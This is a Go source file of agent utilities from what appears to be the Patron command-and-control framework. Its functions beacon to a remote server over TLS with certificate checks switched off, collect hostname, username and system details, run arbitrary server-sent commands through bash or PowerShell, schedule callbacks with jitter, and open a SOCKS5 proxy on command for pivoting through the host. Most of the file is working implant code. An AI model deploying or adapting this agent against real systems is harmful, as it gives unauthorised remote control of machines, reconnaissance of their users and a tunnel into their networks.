package client_utils

// collection of utilities used by all agents

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/armon/go-socks5"
	"github.com/google/uuid"

	"github.com/PatronC2/Patron/client/client_utils/linux/linux_utils"
	"github.com/PatronC2/Patron/client/client_utils/windows/windows_utils"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
)

type ProxyServer struct {
	server   *socks5.Server
	listener net.Listener
	wg       sync.WaitGroup
	cancel   context.CancelFunc
}

func Initialize(logging_enabled string) {
	set_logging, err := strconv.ParseBool(logging_enabled)
	if err != nil {
		fmt.Printf("Failed to parse LoggingEnabled: %v\n", err)
	}
	logger.EnableLogging(set_logging)
	if set_logging {
		if err := logger.SetLogFile("app.log"); err != nil {
			fmt.Printf("Error setting log file: %v\n", err)
		}
	}
	common.RegisterGobTypes()
}

func LoadCertificate(RootCert string) (*tls.Config, error) {
	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publicKey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func GenerateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	var hostname string
	var username string

	if runtime.GOOS == "windows" {
		hostname = strings.TrimSpace(RunShellCommand("hostname"))
	} else {
		hostname = strings.TrimSpace(RunShellCommand("hostname -f"))
	}
	username = strings.TrimSpace(RunShellCommand("whoami"))

	if hostname == "" {
		hostname = "unknown-host"
	}
	if username == "" {
		username = "unknown-user"
	}

	return agentID, hostname, username
}

func RunShellCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-Command", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
	var address string
	if net.ParseIP(ServerIP).To4() == nil {
		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
	} else {
		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
	}

	logger.Logf(logger.Info, "Dialing %v", address)

	beacon, err := tls.Dial("tcp", address, config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
		return nil, nil, nil, err
	}
	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
}

func GetLocalIP(beacon *tls.Conn) string {
	return beacon.LocalAddr().(*net.TCPAddr).IP.String()
}

func SendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
}

func HandleError(beacon *tls.Conn, reqType string, err error) {
	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
	beacon.Close()
	time.Sleep(2 * time.Second)
}

func CalculateSleepInterval(CallbackFrequency string, CallbackJitter string) float64 {
	// DEPRECATED - USE CalculateNextCallbackTime
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	frequency, _ := strconv.Atoi(CallbackFrequency)
	jitter, _ := strconv.Atoi(CallbackJitter)
	jitterPercent := float64(jitter) * 0.01
	baseTime := float64(frequency)
	variance := baseTime * jitterPercent * r.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}

func CalculateNextCallbackTime(callbackFrequency string, callbackJitter string) time.Time {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	frequency, _ := strconv.Atoi(callbackFrequency)
	jitter, _ := strconv.Atoi(callbackJitter)

	baseTime := float64(frequency)
	jitterPercent := float64(jitter) * 0.01
	variance := baseTime * jitterPercent * r.Float64()

	finalInterval := baseTime - (jitterPercent * baseTime) + 2*variance

	return time.Now().UTC().Add(time.Duration(finalInterval * float64(time.Second)))
}

func GetOSInfo() (string, string, string, string, string) {
	osType := runtime.GOOS
	osArch := runtime.GOARCH
	cpus := strconv.Itoa(runtime.NumCPU())

	var memory string
	if osType == "windows" {
		output := RunShellCommand("wmic os get TotalVisibleMemorySize /Value")
		memory = windows_utils.ParseWindowsMemory(output)
	} else {
		output := RunShellCommand("cat /proc/meminfo")
		memory = linux_utils.ParseLinuxMemory(output)
	}

	var osVersion string
	if osType == "windows" {
		output := RunShellCommand("systeminfo")
		osVersion = windows_utils.ParseWindowsSystemInfo(output)
	} else {
		output := RunShellCommand("uname -sr")
		osVersion = strings.TrimSpace(output)
	}

	return osType, osArch, osVersion, cpus, memory
}

func HandleSocksCommand(beacon *tls.Conn, encoder *gob.Encoder, commandResponse types.CommandResponse, activeProxy **ProxyServer) error {
	if commandResponse.Command == "disable" {
		if *activeProxy != nil {
			logger.Logf(logger.Info, "Disabling SOCKS5 proxy")
			(*activeProxy).StopProxy()
			*activeProxy = nil
			logger.Logf(logger.Done, "SOCKS5 proxy disabled")
		} else {
			logger.Logf(logger.Info, "No active SOCKS5 proxy to disable")
		}
		req := types.CommandStatusRequest{
			AgentID:       commandResponse.AgentID,
			CommandID:     commandResponse.CommandID,
			CommandResult: "1",
			CommandOutput: "Stopped SOCKS5 Proxy",
		}
		SendRequest(encoder, types.CommandStatusRequestType, req)
	} else {
		if *activeProxy != nil {
			logger.Logf(logger.Warning, "A SOCKS5 proxy is already running. Cannot start a new one.")
			req := types.CommandStatusRequest{
				AgentID:       commandResponse.AgentID,
				CommandID:     commandResponse.CommandID,
				CommandResult: "1",
				CommandOutput: "A SOCKS5 proxy is already running. Stop it before starting a new one.",
			}
			SendRequest(encoder, types.CommandStatusRequestType, req)
			return nil
		}

		portStr := commandResponse.Command
		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			logger.Logf(logger.Error, "Invalid port number: %s", portStr)
			req := types.CommandStatusRequest{
				AgentID:       commandResponse.AgentID,
				CommandID:     commandResponse.CommandID,
				CommandResult: "1",
				CommandOutput: fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
			}
			SendRequest(encoder, types.CommandStatusRequestType, req)
			return nil
		}

		logger.Logf(logger.Debug, "Starting SOCKS5 proxy on port %d", port)
		conf := &socks5.Config{}
		server, err := socks5.New(conf)
		if err != nil {
			logger.Logf(logger.Warning, "failed to create SOCKS5 server: %v", err)
			req := types.CommandStatusRequest{
				AgentID:       commandResponse.AgentID,
				CommandID:     commandResponse.CommandID,
				CommandResult: "1",
				CommandOutput: fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
			}
			SendRequest(encoder, types.CommandStatusRequestType, req)
			return nil
		}

		// Start the listener
		listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
		if err != nil {
			logger.Logf(logger.Warning, "failed to start listener on port %d: %v", port, err)
			req := types.CommandStatusRequest{
				AgentID:       commandResponse.AgentID,
				CommandID:     commandResponse.CommandID,
				CommandResult: "1",
				CommandOutput: fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
			}
			SendRequest(encoder, types.CommandStatusRequestType, req)
			return nil
		}

		ctx, cancel := context.WithCancel(context.Background())
		proxy := &ProxyServer{
			server:   server,
			listener: listener,
			cancel:   cancel,
		}

		proxy.wg.Add(1)
		go func() {
			defer proxy.wg.Done()
			logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
			if err := server.Serve(listener); err != nil && ctx.Err() == nil {
				logger.Logf(logger.Error, "Error while running SOCKS5 proxy server: %v", err)
			}
		}()

		*activeProxy = proxy
		logger.Logf(logger.Done, "Started SOCKS5 proxy")
		req := types.CommandStatusRequest{
			AgentID:       commandResponse.AgentID,
			CommandID:     commandResponse.CommandID,
			CommandResult: "1",
			CommandOutput: "Started SOCKS5 Proxy",
		}
		SendRequest(encoder, types.CommandStatusRequestType, req)
	}
	return nil
}

func (p *ProxyServer) StopProxy() {
	logger.Logf(logger.Info, "Stopping SOCKS5 proxy server...")
	p.cancel()
	p.listener.Close()
	p.wg.Wait()
	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
}

func HandleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) error {
	configReq := CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback)
	if err := SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
		return err
	}

	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return err
	}

	if response.Type == types.ConfigurationResponseType {
		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
			UpdateClientConfig(configResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
		} else {
			return fmt.Errorf("unexpected payload type")
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) types.ConfigurationRequest {
	return types.ConfigurationRequest{
		AgentID:           agentID,
		Username:          username,
		Hostname:          hostname,
		OSType:            osType,
		OSArch:            osArch,
		OSBuild:           osVersion,
		CPUS:              cpus,
		MEMORY:            memory,
		AgentIP:           ip,
		ServerIP:          ServerIP,
		ServerPort:        ServerPort,
		CallbackFrequency: CallbackFrequency,
		CallbackJitter:    CallbackJitter,
		NextCallback:      nextCallback,
		MasterKey:         "MASTERKEY",
	}
}

func UpdateClientConfig(config types.ConfigurationResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string) {
	UpdateConfigField(&ServerIP, config.ServerIP, "callback IP")
	UpdateConfigField(&ServerPort, config.ServerPort, "callback port")
	UpdateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
	UpdateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
}

func UpdateConfigField(current *string, new, fieldName string) {
	if *current != new {
		logger.Logf(logger.Info, "Updating %s", fieldName)
		*current = new
	}
}
